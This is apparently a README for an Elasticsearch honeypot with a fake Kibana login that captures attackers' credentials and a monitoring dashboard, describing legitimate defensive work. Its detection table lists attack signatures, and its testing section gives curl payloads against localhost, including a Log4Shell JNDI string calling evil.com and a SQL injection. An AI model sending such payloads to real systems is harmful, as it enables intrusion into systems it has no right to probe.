# 🍯 Delilah Honeypot

Elasticsearch honeypot for attack detection and threat intelligence.

---

## Project Structure

```
delilah/
├── honeypot.py          # Trap server (port 9200)
├── monitor.py           # Dashboard (port 8080)
├── .env                 # Credentials & config (never commit this)
├── requirements.txt     # Python dependencies
├── Dockerfile.honeypot
├── Dockerfile.monitor
└── docker-compose.yml
```

---

## Quick Start (Docker — recommended)

```bash
# 1. Edit your credentials in .env first
nano .env

# 2. Build and start both services
docker-compose up --build -d

# 3. Open the dashboard
open http://localhost:8080

# 4. View logs
docker-compose logs -f
```

---

## Quick Start (without Docker)

```bash
# Install dependencies
pip install -r requirements.txt

# Terminal 1 — start honeypot
python honeypot.py

# Terminal 2 — start dashboard
python monitor.py
```

---

## What's Running

| Service   | Port | Description                          |
|-----------|------|--------------------------------------|
| Honeypot  | 9200 | Fake Elasticsearch + Kibana login    |
| Dashboard | 8080 | Real-time monitoring interface       |

---

## Fake Endpoints (honeypot)

| Endpoint        | Purpose                                      |
|-----------------|----------------------------------------------|
| `/`             | Fake Elasticsearch root response             |
| `/_search`      | Attack detection — all methods               |
| `/login`        | Fake Kibana login — harvests credentials     |
| `/kibana`       | Fake Kibana login — harvests credentials     |
| `/kibana/login` | Fake Kibana login — harvests credentials     |
| `/app/kibana`   | Fake Kibana login — harvests credentials     |
| `/*`            | Catch-all — classifies any other path probe  |

---

## Dashboard Tabs

- **Event Log** — searchable, filterable table of all events with GET/POST method column
- **Analytics** — hourly bar chart, attack type donut, 7-day timeline, top countries bar chart
- **World Map** — Leaflet.js map with geo-located attacker markers
- **Harvested Credentials** — usernames and passwords submitted to the fake login page

---

## Attack Categories Detected

| Category                  | Example Signatures                              |
|---------------------------|-------------------------------------------------|
| Automated Scanner         | Shodan, Nmap, Nikto, sqlmap (User-Agent)        |
| CVE Exploit Probe         | Log4Shell, ShellShock, Spring4Shell             |
| SQL Injection             | `' OR 1=1`, `UNION SELECT`, `DROP TABLE`        |
| XSS Attempt               | `<script>`, `javascript:`, `onerror=`           |
| Path Traversal / LFI      | `../`, `/etc/passwd`, `../../../../`            |
| Command Injection         | `wget`, `bash`, `;id`, `powershell`             |
| Admin Panel Probe         | `/wp-admin`, `/.env`, `/phpmyadmin`             |
| Reconnaissance            | `/_cat`, `/_cluster`, `/_nodes`                 |
| Credential Submission     | POST to fake login page                         |

---

## Simulate Attacks (testing)

```bash
# Recon
curl http://localhost:9200/

# SQL injection via POST
curl -X POST "http://localhost:9200/_search" \
  -d "q=1' OR 1=1--"

# Log4Shell CVE
curl -H 'User-Agent: ${jndi:ldap://evil.com/a}' http://localhost:9200/

# Admin probe
curl http://localhost:9200/wp-admin

# Fake login — credential harvesting
curl -X POST http://localhost:9200/kibana/login \
  -d "username=admin&password=admin123"

# Scanner fingerprint
curl -A "sqlmap/1.6" http://localhost:9200/
```

---

## Environment Variables (.env)

| Variable                | Default          | Description                              |
|-------------------------|------------------|------------------------------------------|
| `SMTP_SERVER`           | smtp.gmail.com   | SMTP host for alerts                     |
| `SMTP_PORT`             | 587              | SMTP port                                |
| `ALERT_EMAIL`           | —                | Sending email address                    |
| `ALERT_PASSWORD`        | —                | Email password / app password            |
| `ALERT_RECIPIENT`       | —                | Where to send alerts                     |
| `ALERT_COOLDOWN_SECONDS`| 600              | Min seconds between alerts per IP        |
| `HONEYPOT_PORT`         | 9200             | Honeypot listening port                  |
| `MONITOR_PORT`          | 8080             | Dashboard listening port                 |

---

## ⚠️ Legal Notice

Only deploy on infrastructure you own. Running a honeypot on public cloud requires checking
your provider's acceptable use policy. Never use this to attack or probe systems you do not own.
